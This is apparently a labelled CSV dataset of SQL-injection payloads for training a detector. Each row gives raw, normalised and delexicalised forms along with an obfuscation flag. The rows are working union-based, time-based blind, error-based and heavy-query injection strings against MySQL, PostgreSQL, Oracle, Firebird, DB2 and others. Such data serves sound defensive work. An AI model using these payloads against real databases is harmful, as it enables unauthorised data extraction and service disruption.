payload_raw,payload_norm,payload_delex,label,is_obfuscated,sqli_type_hint,source
"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","1' ) where 4297 = 4297 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","<NUM>' ) where <NUM> = <NUM> or <NUM> = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,False,,sqli_dataset
"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""pnub""  =  ""pnub","1"" or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ""pnub"" = ""pnub",<NUM><STR>pnub<STR>pnub,1,True,,sqli_dataset
"iif  (  2084  =  5671,1,1/0  )","iif ( 2084 = 5671,1,1/0 )","iif ( <NUM> = <NUM>,<NUM>,<NUM>/<NUM> )",1,False,,sqli_dataset
"1'   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'raus'  =  'raus","1' ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( 'raus' = 'raus",<NUM><STR>raus<STR>raus,1,False,,sqli_dataset
1'  )   rlike sleep  (  5  ),1' ) rlike sleep ( 5 ),<NUM>' ) rlike sleep ( <NUM> ),1,False,,sqli_dataset
"-8409%'  )   or make_set  (  9354  =  9354,7185  )   and   (  '%'  =  '","-8409%' ) or make_set ( 9354 = 9354,7185 ) and ( '%' = '",-<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'pqxe' like 'pqxe","1' ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'pqxe' like 'pqxe",<NUM><STR>pqxe<STR>pqxe,1,True,,sqli_dataset
"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--","-8812"" ) where 1646 = 1646 union all select 1646,1646,1646,1646,1646,1646--","-<NUM>"" ) where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
(  select   (  case when   (  6035  =  9882  )   then 6035 else 6035*  (  select 6035 from mysql.db  )   end   )    ),( select ( case when ( 6035 = 9882 ) then 6035 else 6035* ( select 6035 from mysql.db ) end ) ),( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>* ( select <NUM> from mysql.db ) end ) ),1,False,,sqli_dataset
waitfor delay '0:0:5' and   (  'eaxu'  =  'eaxu,waitfor delay '0:0:5' and ( 'eaxu' = 'eaxu,waitfor delay <STR> and ( <STR> = 'eaxu,1,False,,sqli_dataset
"1%""   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""%""  =  ""","1%"" ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""%"" = """,<NUM>%<STR>%<STR>,1,False,,sqli_dataset
1'   )    ),1' ) ),<NUM>' ) ),1,False,,sqli_dataset
"1' and make_set  (  8403  =  8403,8899  )   and 'fttd' like 'fttd","1' and make_set ( 8403 = 8403,8899 ) and 'fttd' like 'fttd",<NUM><STR>fttd<STR>fttd,1,False,,sqli_dataset
"-7333%""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""%""  =  ""","-7333%"" ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( ""%"" = """,-<NUM>%<STR>%<STR>,1,False,,sqli_dataset
1'   )    )    rlike   (  select   (  case when   (  8489  =  8820  )   then 1 else 0x28 end   )    )    and    (    (   'fbjf'  =  'fbjf,1' ) ) rlike ( select ( case when ( 8489 = 8820 ) then 1 else 0x28 end ) ) and ( ( 'fbjf' = 'fbjf,<NUM><STR>fbjf<STR>fbjf,1,True,,sqli_dataset
"-6505'   )    )    as jtnp where 1037  =  1037 or elt  (  1032  =  1032,3623  )  --","-6505' ) ) as jtnp where 1037 = 1037 or elt ( 1032 = 1032,3623 ) --","-<NUM>' ) ) as jtnp where <NUM> = <NUM> or elt ( <NUM> = <NUM>,<NUM> ) --",1,False,,sqli_dataset
"1""  )   union all select null,null#","1"" ) union all select null,null#","<NUM>"" ) union all select null,null#",1,False,,sqli_dataset
"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'","1'+ ( select zukr where 9215 = 9215 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) ) +'",<NUM><STR>,1,True,,sqli_dataset
"1%""   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","1%"" ) ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","<NUM>%"" ) ) ) and <NUM> = like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) --",1,False,,sqli_dataset
-1087  )   where 5787  =  5787 union all select 5787#,-1087 ) where 5787 = 5787 union all select 5787#,-<NUM> ) where <NUM> = <NUM> union all select <NUM>#,1,False,,sqli_dataset
1'  )   where 4364  =  4364 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1' ) where 4364 = 4364 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,<NUM>' ) where <NUM> = <NUM> and <NUM> = ( select <NUM> from pg_sleep ( <NUM> ) ) --,1,False,,sqli_dataset
"1 where 8390  =  8390 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --","1 where 8390 = 8390 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --","<NUM> where <NUM> = <NUM> and <NUM> = benchmark ( <NUM>,md5 ( 0x76555642 ) ) --",1,True,,sqli_dataset
"-1408   )    )    union all select 5715,5715,5715,5715,5715,5715--","-1408 ) ) union all select 5715,5715,5715,5715,5715,5715--","-<NUM> ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"select pg_sleep  (  5  )   and    (    (     (  ""%""  =  ""","select pg_sleep ( 5 ) and ( ( ( ""%"" = ""","select pg_sleep ( <NUM> ) and ( ( ( <STR> = """,1,False,,sqli_dataset
1'  )   as tsge where 6970  =  6970,1' ) as tsge where 6970 = 6970,<NUM>' ) as tsge where <NUM> = <NUM>,1,False,,sqli_dataset
1'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'kkgt'  =  'kkgt,1' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'kkgt' = 'kkgt,<NUM><STR>kkgt<STR>kkgt,1,True,,sqli_dataset
"1   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  -- huss","1 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) -- huss","<NUM> ( select ( case when ( <NUM> = <NUM> ) then regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) else char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) end ) from ( values ( <NUM> ) ) ) -- huss",1,False,,sqli_dataset
"1   )    )    union all select null,null,null,null,null,null,null#","1 ) ) union all select null,null,null,null,null,null,null#","<NUM> ) ) union all select null,null,null,null,null,null,null#",1,False,,sqli_dataset
"1%""   )    )     )   and 7758  =  4792 and    (    (     (  ""%""  =  ""","1%"" ) ) ) and 7758 = 4792 and ( ( ( ""%"" = """,<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1%""  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --","1%"" ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --","<NUM>%"" ) or char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) --",1,False,,sqli_dataset
1'  )   and sleep  (  5  )   and   (  'xecl' like 'xecl,1' ) and sleep ( 5 ) and ( 'xecl' like 'xecl,<NUM><STR>xecl<STR>xecl,1,False,,sqli_dataset
"1 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   # irvm","1 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) # irvm","<NUM> or <NUM> = benchmark ( <NUM>,md5 ( 0x694a4745 ) ) # irvm",1,True,,sqli_dataset
"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --","1 ) as ooex where 1087 = 1087 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --","<NUM> ) as ooex where <NUM> = <NUM> or char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) --",1,False,,sqli_dataset
end and    (    (   'vcaf' like 'vcaf,end and ( ( 'vcaf' like 'vcaf,end and ( ( <STR> like 'vcaf,1,False,,sqli_dataset
"1%"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","1%"" or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","<NUM>%"" or <NUM> = ( select count ( * ) from generate_series ( <NUM>,<NUM> ) ) --",1,False,,sqli_dataset
"1""   )    )    as esho where 8864  =  8864 order by 1--","1"" ) ) as esho where 8864 = 8864 order by 1--","<NUM>"" ) ) as esho where <NUM> = <NUM> order by <NUM>--",1,False,,sqli_dataset
"-4280%""   )    )     )   union all select 7981,7981--","-4280%"" ) ) ) union all select 7981,7981--","-<NUM>%"" ) ) ) union all select <NUM>,<NUM>--",1,False,,sqli_dataset
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  +'","select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) +'","select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) +'",1,True,,sqli_dataset
1'+  (  select 'fqkk' where 9725  =  9725,1'+ ( select 'fqkk' where 9725 = 9725,<NUM><STR>fqkk' where <NUM> = <NUM>,1,True,,sqli_dataset
"1"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )","1"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) )","<NUM>"" and <NUM> = benchmark ( <NUM>,md5 ( 0x76555642 ) )",1,True,,sqli_dataset
"1""  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #","1"" ) or elt ( 5873 = 5873,sleep ( 5 ) ) #","<NUM>"" ) or elt ( <NUM> = <NUM>,sleep ( <NUM> ) ) #",1,False,,sqli_dataset
"-1072%""   )    )    or 3090  =  3539","-1072%"" ) ) or 3090 = 3539","-<NUM>%"" ) ) or <NUM> = <NUM>",1,False,,sqli_dataset
"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--","-9574' ) as rxym where 4719 = 4719 union all select 4719,4719,4719,4719,4719,4719,4719--","-<NUM>' ) as rxym where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"-8833'   )    )    union all select 3227,3227,3227,3227,3227--","-8833' ) ) union all select 3227,3227,3227,3227,3227--","-<NUM>' ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'cysu' like 'cysu","1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 'cysu' like 'cysu",<NUM><STR>cysu<STR>cysu,1,False,,sqli_dataset
"1'   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'zfrs'  =  'zfrs","1' ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( 'zfrs' = 'zfrs",<NUM><STR>zfrs<STR>zfrs,1,False,,sqli_dataset
1'  )   and sleep  (  5  )   and   (  'orxt'  =  'orxt,1' ) and sleep ( 5 ) and ( 'orxt' = 'orxt,<NUM><STR>orxt<STR>orxt,1,False,,sqli_dataset
end and    (    (     (  3673  =  3673,end and ( ( ( 3673 = 3673,end and ( ( ( <NUM> = <NUM>,1,False,,sqli_dataset
"-4637"" where 8354  =  8354 or 1186  =  2714--","-4637"" where 8354 = 8354 or 1186 = 2714--","-<NUM>"" where <NUM> = <NUM> or <NUM> = <NUM>--",1,False,,sqli_dataset
end# ckxq,end# ckxq,end# ckxq,1,False,,sqli_dataset
1'+  (  select ejaj where 1651  =  1651 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',1'+ ( select ejaj where 1651 = 1651 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) ) +',<NUM><STR>,1,True,,sqli_dataset
"-9558""   )    )     )   union all select 2935,2935,2935,2935,2935--","-9558"" ) ) ) union all select 2935,2935,2935,2935,2935--","-<NUM>"" ) ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1'  )   union all select null,null,null,null,null#","1' ) union all select null,null,null,null,null#","<NUM>' ) union all select null,null,null,null,null#",1,False,,sqli_dataset
"1%'   )    )    union all select null,null,null,null,null,null--","1%' ) ) union all select null,null,null,null,null,null--","<NUM>%' ) ) union all select null,null,null,null,null,null--",1,False,,sqli_dataset
"1""   )    )    as vtad where 3653  =  3653 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #","1"" ) ) as vtad where 3653 = 3653 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #","<NUM>"" ) ) as vtad where <NUM> = <NUM> procedure analyse ( extractvalue ( <NUM>,concat ( 0x5c, ( benchmark ( <NUM>,md5 ( 0x4b774c75 ) ) ) ) ) ,<NUM> ) #",1,True,,sqli_dataset
1'||  (  select 'mobv' from dual where 6338  =  6338,1'|| ( select 'mobv' from dual where 6338 = 6338,<NUM><STR>mobv' from dual where <NUM> = <NUM>,1,False,,sqli_dataset
"-2964""   )    )    order by 1--","-2964"" ) ) order by 1--","-<NUM>"" ) ) order by <NUM>--",1,False,,sqli_dataset
"-9208%""   )    )    or 8571  =  8571--","-9208%"" ) ) or 8571 = 8571--","-<NUM>%"" ) ) or <NUM> = <NUM>--",1,False,,sqli_dataset
"1""   )    )    as drss where 2077  =  2077 and 7533  =  7533--","1"" ) ) as drss where 2077 = 2077 and 7533 = 7533--","<NUM>"" ) ) as drss where <NUM> = <NUM> and <NUM> = <NUM>--",1,False,,sqli_dataset
(  select   (  case when   (  6838  =  2866  )   then 6838 else 1/  (  select 0  )   end   )    ),( select ( case when ( 6838 = 2866 ) then 6838 else 1/ ( select 0 ) end ) ),( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>/ ( select <NUM> ) end ) ),1,False,,sqli_dataset
"-5866'   )    )    as phzq where 3803  =  3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--","-5866' ) ) as phzq where 3803 = 3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--","-<NUM>' ) ) as phzq where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"-4168'  )   union all select 2618,2618#","-4168' ) union all select 2618,2618#","-<NUM>' ) union all select <NUM>,<NUM>#",1,False,,sqli_dataset
1'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  'odsl' like 'odsl,1' ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( 'odsl' like 'odsl,<NUM><STR>odsl<STR>odsl,1,False,,sqli_dataset
"1'||  (  select 'votg' where 5105  =  5105 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","1'|| ( select 'votg' where 5105 = 5105 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","<NUM><STR>votg' where <NUM> = <NUM> or <NUM> = ( select count ( * ) from generate_series ( <NUM>,<NUM> ) ) --",1,False,,sqli_dataset
"1 where 1062  =  1062 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --","1 where 1062 = 1062 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","<NUM> where <NUM> = <NUM> and char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) --",1,False,,sqli_dataset
1  )   where 1096  =  1096,1 ) where 1096 = 1096,<NUM> ) where <NUM> = <NUM>,1,False,,sqli_dataset
"1  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  5220  =  5220","1 ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( 5220 = 5220","<NUM> ) and row ( <NUM>,<NUM> ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) x from ( select <NUM> union select <NUM> union select <NUM> union select <NUM> ) a group by x ) and ( <NUM> = <NUM>",1,True,,sqli_dataset
"1%'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  '%'  =  '","1%' ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( '%' = '",<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1'  )   as wnys where 6457  =  6457 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #","1' ) as wnys where 6457 = 6457 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #","<NUM>' ) as wnys where <NUM> = <NUM> or <NUM> = benchmark ( <NUM>,md5 ( 0x544d5a4c ) ) #",1,True,,sqli_dataset
"1""  )   as eefe where 5290  =  5290 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #","1"" ) as eefe where 5290 = 5290 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #","<NUM>"" ) as eefe where <NUM> = <NUM> and ( select * from ( select ( sleep ( <NUM> ) ) ) gcrr ) #",1,False,,sqli_dataset
"1 and make_set  (  8403  =  8403,8899  )  # zysq","1 and make_set ( 8403 = 8403,8899 ) # zysq","<NUM> and make_set ( <NUM> = <NUM>,<NUM> ) # zysq",1,False,,sqli_dataset
"1'   )    )     )   union all select null,null,null,null,null,null,null--","1' ) ) ) union all select null,null,null,null,null,null,null--","<NUM>' ) ) ) union all select null,null,null,null,null,null,null--",1,False,,sqli_dataset
-4428  )   or 3038  =  3038,-4428 ) or 3038 = 3038,-<NUM> ) or <NUM> = <NUM>,1,False,,sqli_dataset
"1'   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'odkr'  =  'odkr","1' ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( 'odkr' = 'odkr",<NUM><STR>odkr<STR>odkr,1,False,,sqli_dataset
